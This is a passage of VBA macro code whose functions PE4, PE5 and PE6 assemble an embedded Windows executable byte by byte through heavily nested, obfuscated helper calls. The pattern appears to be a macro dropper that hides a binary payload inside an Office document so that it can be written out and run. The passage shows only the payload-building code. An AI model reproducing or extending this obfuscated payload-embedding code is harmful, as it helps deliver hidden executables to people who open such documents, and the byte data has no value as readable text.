    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 141), "k "), 133), 246), 15), 142), 187), 1), 0), 0), 15), 31), 0), 15), 182), 7), 185), "0"), 0), 0), 0), 132), 192), "t"), 7), "H"), 131), 199), 1), 15), 190), 200), "H"), 137), 218), 232), 245), 240), 255), 255), 131), 238), 1), 15), 132), 212), 0), 0), 0)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(strPE, 246), "C"), 9), 16), "t"), 214), "f"), 131), "{ "), 0), "t"), 207), "i"), 198), 171), 170), 170), 170), "=UUUUw"), 194), "I"), 137), 216), 186), 1), 0), 0), 0), "H"), 137), 233), 232), 34), 241), 255), 255), 235), 176), "A"), 139), "Q"), 16), "D)")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 192), "9"), 208), 15), 142), 250), 254), 255), 255), ")"), 208), 137), "C"), 12), 133), 210), 15), 142), 180), 1), 0), 0), 131), 232), 1), 137), "C"), 12), 133), 246), "~"), 10), 246), "C"), 9), 16), 15), 133), 235), 254), 255), 255), 133), 192), 15), 142), "0"), 255), 255), 255)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 133), 237), 15), 133), 248), 0), 0), 0), 139), "S"), 8), 247), 194), 192), 1), 0), 0), 15), 132), 241), 1), 0), 0), 131), 232), 1), 137), "C"), 12), 15), 132), 24), 255), 255), 255), 246), 198), 6), 15), 133), 15), 255), 255), 255), 131), 232), 1), 137), "C"), 12)

    PE4 = strPE
End Function

Private Function PE5() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "f"), 15), 31), "D"), 0), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), "C"), 240), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 127), 230), 133), 237), 15), 132), 222), 254), 255), 255), "H"), 137), 218), 185), "-"), 0), 0), 0), 232), "!")
    strPE = A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 240), 255), 255), 233), 225), 254), 255), 255), 15), 31), "@"), 0), 139), "C"), 16), 133), 192), 127), 25), 246), "C"), 9), 8), "u"), 19), 131), 232), 1), 137), "C"), 16), "H"), 131), 196), "([^_]"), 195), 15), 31), "@"), 0), "H"), 137), 217), 232), 176), 252)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 255), 255), 235), "!f"), 15), 31), "D"), 0), 0), 15), 182), 7), 185), "0"), 0), 0), 0), 132), 192), "t"), 7), "H"), 131), 199), 1), 15), 190), 200), "H"), 137), 218), 232), 205), 239), 255), 255), 139), "C"), 16), 141), "P"), 255), 137), "S"), 16), 133), 192), 127), 216)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "H"), 131), 196), "([^_]"), 195), 15), 31), 128), 0), 0), 0), 0), 133), 192), 15), 142), "H"), 1), 0), 0), 131), 232), 1), 139), "S"), 16), "9"), 208), 15), 143), 233), 254), 255), 255), 199), "C"), 12), 255), 255), 255), 255), 233), "6"), 254), 255), 255)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "f"), 15), 31), "D"), 0), 0), 131), 232), 1), 137), "C"), 12), 15), 132), "N"), 255), 255), 255), 247), "C"), 8), 0), 6), 0), 0), 15), 132), 19), 255), 255), 255), "H"), 137), 218), 185), "-"), 0), 0), 0), 232), "b"), 239), 255), 255), 233), 34), 254), 255), 255), 15)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 31), "D"), 0), 0), "H"), 137), 218), 185), "0"), 0), 0), 0), 232), "K"), 239), 255), 255), 139), "C"), 16), 133), 192), 127), 20), 246), "C"), 9), 8), "u"), 14), 133), 246), "u"), 29), 233), "*"), 255), 255), 255), 15), 31), "D"), 0), 0), "H"), 137), 217), 232), 232), 251)
    strPE = B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(strPE, 255), 255), 133), 246), 15), 132), "S"), 255), 255), 255), 139), "C"), 16), 1), 240), 137), "C"), 16), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 137), 218), 185), "0"), 0), 0), 0), 232), 3), 239), 255), 255), 131), 198), 1), "u"), 238), 233), ","), 255), 255), 255), "f")
    strPE = B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 15), 31), 132), 0), 0), 0), 0), 0), 139), "S"), 8), 246), 198), 8), 15), 133), "@"), 254), 255), 255), 133), 246), 15), 142), "T"), 254), 255), 255), 128), 230), 16), 15), 132), "K"), 254), 255), 255), "f"), 131), "{ "), 0), 15), 132), "@"), 254), 255), 255), 233), ")")
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 253), 255), 255), 15), 31), 0), "H"), 137), 218), 185), "+"), 0), 0), 0), 232), 179), 238), 255), 255), 233), "s"), 253), 255), 255), "f"), 15), 31), "D"), 0), 0), 131), 232), 1), 137), "C"), 12), "f"), 144), "H"), 137), 218), 185), "0"), 0), 0), 0), 232), 147), 238), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 127), 230), 233), "b"), 253), 255), 255), 144), 246), 198), 6), 15), 133), "*"), 253), 255), 255), 139), "C"), 12), 141), "H"), 255), 137), "K"), 12), 133), 192), 15), 142), 25), 253), 255), 255), 233), 17), 254), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 255), 144), 15), 132), 181), 254), 255), 255), 199), "C"), 12), 255), 255), 255), 255), 233), 246), 252), 255), 255), "f"), 15), 31), "D"), 0), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), ";"), 238), 255), 255), 233), 251), 252), 255), 255), 137), 208), 233), 159), 253), 255)
    strPE = B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 255), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), "@"), 0), "AUATSH"), 131), 236), " A"), 186), 1), 0), 0), 0), "A"), 131), 232), 1), "A"), 137), 203), "M"), 137), 204), "Mc"), 232), "A"), 193), 248), 31), "Ii")
    strPE = B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(strPE, 205), "gfffH"), 193), 249), 34), "D)"), 193), "t"), 27), "Hc"), 193), 193), 249), 31), "A"), 131), 194), 1), "Hi"), 192), "gfffH"), 193), 248), 34), ")"), 200), 137), 193), "u"), 229), "A"), 139), "D$,"), 131), 248), 255), "u")
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(strPE, 14), "A"), 199), "D$,"), 2), 0), 0), 0), 184), 2), 0), 0), 0), "D9"), 208), "D"), 137), 211), "E"), 139), "D$"), 12), "M"), 137), 225), 15), "M"), 216), "D"), 137), 192), 141), "K"), 2), ")"), 200), "A9"), 200), 185), 255), 255), 255), 255), "A"), 184)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 1), 0), 0), 0), 15), "N"), 193), "D"), 137), 217), "A"), 137), "D$"), 12), 232), 166), 251), 255), 255), "A"), 139), "L$"), 8), "A"), 139), "D$,L"), 137), 226), "A"), 137), "D$"), 16), 137), 200), 131), 225), " "), 13), 192), 1), 0), 0), 131), 201)
    strPE = B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(strPE, "EA"), 137), "D$"), 8), 232), "]"), 237), 255), 255), "D"), 141), "S"), 1), "L"), 137), 226), "L"), 137), 233), "E"), 1), "T$"), 12), "H"), 131), 196), " [A\A]"), 233), "P"), 246), 255), 255), "ATSH"), 131), 236), "hD"), 139), "B")
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 16), 219), ")H"), 137), 211), "E"), 133), 192), "xkA"), 131), 192), 1), "H"), 141), "D$H"), 219), "|$P"), 243), 15), "oD$PH"), 141), "T$0L"), 141), "L$L"), 185), 2), 0), 0), 0), "H"), 137), "D$ ")
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 15), 17), "D$0"), 232), 218), 235), 255), 255), "D"), 139), "D$LI"), 137), 196), "A"), 129), 248), 0), 128), 255), 255), "t9"), 139), "L$HI"), 137), 217), "H"), 137), 194), 232), 186), 254), 255), 255), "L"), 137), 225), 232), "b"), 18), 0), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(strPE, 144), "H"), 131), 196), "h[A\"), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), 199), "B"), 16), 6), 0), 0), 0), "A"), 184), 7), 0), 0), 0), 235), 138), 144), 139), "L$HI"), 137), 216), "H"), 137), 194), 232), 225), 239), 255), 255), "L")
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(strPE, 137), 225), 232), ")"), 18), 0), 0), 144), "H"), 131), 196), "h[A\"), 195), "ATSH"), 131), 236), "hD"), 139), "B"), 16), 219), ")H"), 137), 211), "E"), 133), 192), "y"), 13), 199), "B"), 16), 6), 0), 0), 0), "A"), 184), 6), 0), 0), 0)
    strPE = B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(strPE, "H"), 141), "D$H"), 219), "|$P"), 243), 15), "oD$PH"), 141), "T$0L"), 141), "L$L"), 185), 3), 0), 0), 0), "H"), 137), "D$ "), 15), 17), "D$0"), 232), "!"), 235), 255), 255), "D"), 139), "D$L")
    strPE = A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "I"), 137), 196), "A"), 129), 248), 0), 128), 255), 255), "th"), 139), "L$HH"), 137), 194), "I"), 137), 217), 232), "A"), 250), 255), 255), 139), "C"), 12), 235), 24), 15), 31), "@"), 0), "HcC$"), 198), 4), 2), " "), 139), "S$"), 139), "C"), 12)
    strPE = B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 131), 194), 1), 137), "S$"), 137), 194), 131), 232), 1), 137), "C"), 12), 133), 210), "~?"), 139), "K"), 8), 246), 197), "@u"), 8), 139), "S$9S(~"), 222), "H"), 139), 19), 128), 229), " t"), 200), 185), " "), 0), 0), 0), 232), 222), "8")
    strPE = A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(strPE, 0), 0), 139), "S$"), 139), "C"), 12), 235), 196), "f"), 15), 31), "D"), 0), 0), 139), "L$HI"), 137), 216), "H"), 137), 194), 232), 249), 238), 255), 255), "L"), 137), 225), 232), "A"), 17), 0), 0), 144), "H"), 131), 196), "h[A\"), 195), 15), 31)
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(strPE, 132), 0), 0), 0), 0), 0), "ATVSH"), 131), 236), "`D"), 139), "B"), 16), 219), ")H"), 137), 211), "E"), 133), 192), 15), 136), 254), 0), 0), 0), 15), 132), 224), 0), 0), 0), "H"), 141), "D$H"), 219), "|$P"), 243), 15), "o")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "D$PH"), 141), "T$0L"), 141), "L$L"), 185), 2), 0), 0), 0), "H"), 137), "D$ "), 15), 17), "D$0"), 232), "3"), 234), 255), 255), 139), "t$LI"), 137), 196), 129), 254), 0), 128), 255), 255), 15), 132), 208), 0)
    strPE = B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(strPE, 0), 0), 139), "C"), 8), "%"), 0), 8), 0), 0), 131), 254), 253), "|K"), 139), "S"), 16), "9"), 214), 127), "D"), 133), 192), 15), 132), 204), 0), 0), 0), ")"), 242), 137), "S"), 16), 139), "L$HI"), 137), 217), "A"), 137), 240), "L"), 137), 226), 232), "-")
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 249), 255), 255), 235), 16), 15), 31), 0), "H"), 137), 218), 185), " "), 0), 0), 0), 232), 251), 234), 255), 255), 139), "C"), 12), 141), "P"), 255), 137), "S"), 12), 133), 192), 127), 230), 235), "("), 15), 31), "@"), 0), 133), 192), "u4L"), 137), 225), 232), 156), "7")
    strPE = A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 131), 232), 1), 137), "C"), 16), 139), "L$HI"), 137), 217), "A"), 137), 240), "L"), 137), 226), 232), 164), 252), 255), 255), "L"), 137), 225), 232), "L"), 16), 0), 0), 144), "H"), 131), 196), "`[^A\"), 195), "f"), 144), 139), "C"), 16), 131)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 232), 1), 235), 207), 15), 31), 132), 0), 0), 0), 0), 0), 199), "B"), 16), 1), 0), 0), 0), "A"), 184), 1), 0), 0), 0), 233), 14), 255), 255), 255), "f"), 15), 31), "D"), 0), 0), 199), "B"), 16), 6), 0), 0), 0), "A"), 184), 6), 0), 0), 0), 233)
    strPE = B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(strPE, 246), 254), 255), 255), "f"), 15), 31), "D"), 0), 0), 139), "L$HI"), 137), 216), "H"), 137), 194), 232), 161), 237), 255), 255), 235), 155), 15), 31), 128), 0), 0), 0), 0), "L"), 137), 225), 232), 16), "7"), 0), 0), ")"), 240), 137), "C"), 16), 15), 137), "&")
    strPE = A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 255), 255), 255), 139), "S"), 12), 133), 210), 15), 142), 27), 255), 255), 255), 1), 208), 137), "C"), 12), 233), 17), 255), 255), 255), "AUATUWVSH"), 131), 236), "XL"), 139), 17), "D"), 139), "Y"), 8), "E"), 15), 191), 195), "L"), 137), 222)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "C"), 141), 12), 0), "I"), 137), 212), "L"), 137), 210), 15), 183), 201), "H"), 193), 234), " "), 129), 226), 255), 255), 255), 127), "D"), 9), 210), 137), 208), 247), 216), 9), 208), 193), 232), 31), 9), 200), 185), 254), 255), 0), 0), ")"), 193), 193), 233), 16), 15), 133), 217)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 2), 0), 0), "fE"), 133), 219), 15), 136), 215), 1), 0), 0), "f"), 129), 230), 255), 127), 15), 133), 164), 1), 0), 0), "M"), 133), 210), 15), 133), "3"), 3), 0), 0), "A"), 139), "T$"), 16), 131), 250), 14), 15), 134), 245), 1), 0), 0), "A"), 139), "L")
    strPE = A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "$"), 8), "H"), 141), "|$0A"), 139), "D$"), 16), 133), 192), 15), 142), 158), 4), 0), 0), 198), "D$0.H"), 141), "D$1"), 198), 0), "0H"), 141), "X"), 1), "E"), 139), "T$"), 12), 189), 2), 0), 0), 0), "E"), 133), 210)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 15), 142), 138), 0), 0), 0), "A"), 139), "T$"), 16), "I"), 137), 217), 15), 191), 198), "I)"), 249), "F"), 141), 4), 10), 133), 210), 137), 202), "E"), 15), "O"), 200), 129), 226), 192), 1), 0), 0), 131), 250), 1), "H"), 15), 191), 214), "A"), 131), 217), 250), "H")
    strPE = B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(strPE, "i"), 210), "gfff"), 193), 248), 31), "E"), 137), 200), "H"), 193), 250), 34), ")"), 194), "t/f."), 15), 31), 132), 0), 0), 0), 0), 0), "Hc"), 194), "A"), 131), 192), 1), 193), 250), 31), "Hi"), 192), "gfffA"), 141), "h")
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(strPE, 2), "D)"), 205), "H"), 193), 248), 34), ")"), 208), 137), 194), "u"), 222), 15), 191), 237), "E9"), 194), 15), 142), "j"), 3), 0), 0), "E)"), 194), 246), 197), 6), 15), 132), 174), 3), 0), 0), "E"), 137), "T$"), 12), 144), 246), 193), 128), 15), 133), "7")
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 3), 0), 0), 246), 197), 1), 15), 133), "^"), 3), 0), 0), 131), 225), "@"), 15), 133), "u"), 3), 0), 0), "L"), 137), 226), 185), "0"), 0), 0), 0), 232), 200), 232), 255), 255), "A"), 139), "L$"), 8), "L"), 137), 226), 131), 225), " "), 131), 201), "X"), 232), 181)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(strPE, 232), 255), 255), "A"), 139), "D$"), 12), 133), 192), "~2A"), 246), "D$"), 9), 2), "t*"), 131), 232), 1), "A"), 137), "D$"), 12), 15), 31), "@"), 0), "L"), 137), 226), 185), "0"), 0), 0), 0), 232), 139), 232), 255), 255), "A"), 139), "D$"), 12)
    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(strPE, 141), "P"), 255), "A"), 137), "T$"), 12), 133), 192), 127), 226), "L"), 141), "l$.H9"), 251), "w%"), 233), 144), 1), 0), 0), 15), 31), 0), "A"), 15), 183), "D$ f"), 137), "D$.f"), 133), 192), 15), 133), "t"), 2), 0), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(strPE, "H9"), 251), 15), 132), "p"), 1), 0), 0), 15), 190), "K"), 255), "H"), 131), 235), 1), 131), 249), "."), 15), 132), 250), 1), 0), 0), 131), 249), ",t"), 205), "L"), 137), 226), 232), "-"), 232), 255), 255), 235), 215), 15), 31), 0), "f"), 129), 254), 255), 127), "u")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "A"), 133), 210), "u=D"), 137), 193), "H"), 141), 21), 238), "`"), 0), 0), "M"), 137), 224), 129), 225), 0), 128), 0), 0), 233), 9), 1), 0), 0), 15), 31), "D"), 0), 0), "A"), 129), "L$"), 8), 128), 0), 0), 0), "f"), 129), 230), 255), 127), 15), 132)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(strPE, " "), 254), 255), 255), 235), 194), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "A"), 139), "T$"), 16), "f"), 129), 238), 255), "?"), 131), 250), 14), 15), 135), "u"), 1), 0), 0), "M"), 133), 210), "x"), 13), 15), 31), 132), 0), 0), 0), 0), 0), "M"), 1)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 210), "y"), 251), 185), 14), 0), 0), 0), 184), 4), 0), 0), 0), "I"), 209), 234), ")"), 209), 193), 225), 2), "H"), 211), 224), "I"), 1), 194), 15), 136), "5"), 2), 0), 0), "M"), 1), 210), 185), 15), 0), 0), 0), ")"), 209), 193), 225), 2), "I"), 211), 234), "A")
    strPE = A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(strPE, 139), "L$"), 8), "H"), 141), "|$0A"), 137), 201), "A"), 137), 200), "H"), 137), 251), "A"), 129), 225), 0), 8), 0), 0), "A"), 131), 224), " "), 235), "'"), 15), 31), "D"), 0), 0), "1"), 192), "H9"), 251), "w"), 9), "A"), 139), "T$"), 16), 133), 210)
    strPE = A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(strPE, "x"), 9), 131), 192), "0"), 136), 3), "H"), 131), 195), 1), "M"), 133), 210), 15), 132), "~"), 1), 0), 0), "D"), 137), 210), 131), 226), 15), "I"), 247), 194), 240), 255), 255), 255), 15), 132), 3), 1), 0), 0), "A"), 139), "D$"), 16), "I"), 193), 234), 4), 133), 192)
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(strPE, "~"), 8), 131), 232), 1), "A"), 137), "D$"), 16), 133), 210), "t"), 178), 137), 208), 131), 250), 9), "v"), 187), 141), "B7D"), 9), 192), 235), 182), 15), 31), 0), "M"), 137), 224), "H"), 141), 21), 213), "_"), 0), 0), "1"), 201), "H"), 131), 196), "X[^")
    strPE = B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(strPE, "_]A\A]"), 233), "+"), 234), 255), 255), 15), 31), 0), "L"), 137), 226), 185), "0"), 0), 0), 0), 232), 219), 230), 255), 255), "A"), 139), "D$"), 16), 141), "P"), 255), "A"), 137), "T$"), 16), 133), 192), 127), 226), "A"), 139), "L$"), 8), "L")

    PE5 = strPE
End Function

Private Function PE6() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 137), 226), 131), 225), " "), 131), 201), "P"), 232), 183), 230), 255), 255), "A"), 1), "l$"), 12), "H"), 15), 191), 206), "L"), 137), 226), "A"), 129), "L$"), 8), 192), 1), 0), 0), "H"), 131), 196), "X[^_]A\A]"), 233), 161), 239), 255)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 144), 15), 136), 155), 1), 0), 0), 184), 1), 192), 255), 255), 15), 31), "D"), 0), 0), 137), 198), 131), 232), 1), "M"), 1), 210), "y"), 246), "A"), 139), "T$"), 16), 131), 250), 14), 15), 134), 173), 254), 255), 255), "A"), 139), "L$"), 8), 233), 214), 254)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 255), 255), "f"), 15), 31), "D"), 0), 0), "A"), 139), "L$"), 8), "H"), 141), "|$0M"), 133), 210), 15), 133), 189), 254), 255), 255), 233), 149), 252), 255), 255), "L"), 137), 225), 232), 248), 242), 255), 255), 233), 223), 253), 255), 255), 15), 31), 0), "H9")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(strPE, 251), "w"), 19), "E"), 133), 201), "u"), 14), "E"), 139), "\$"), 16), "E"), 133), 219), "~"), 11), 15), 31), "@"), 0), 198), 3), ".H"), 131), 195), 1), 141), "F"), 255), "I"), 131), 250), 1), "t"), 22), 15), 31), 132), 0), 0), 0), 0), 0), 137), 198), "I"), 209)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 234), 141), "F"), 255), "I"), 131), 250), 1), "u"), 242), "E1"), 210), 233), 204), 254), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "M"), 137), 224), 186), 1), 0), 0), 0), "L"), 137), 233), 232), "0"), 230), 255), 255), 233), "w"), 253), 255), 255), 15)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 31), 0), "H9"), 251), 15), 133), "2"), 252), 255), 255), 233), 15), 252), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0), "L"), 137), 226), 185), "-"), 0), 0), 0), 232), 163), 229), 255), 255), 233), 201), 252), 255), 255), "f"), 15), 31), "D"), 0), 0)
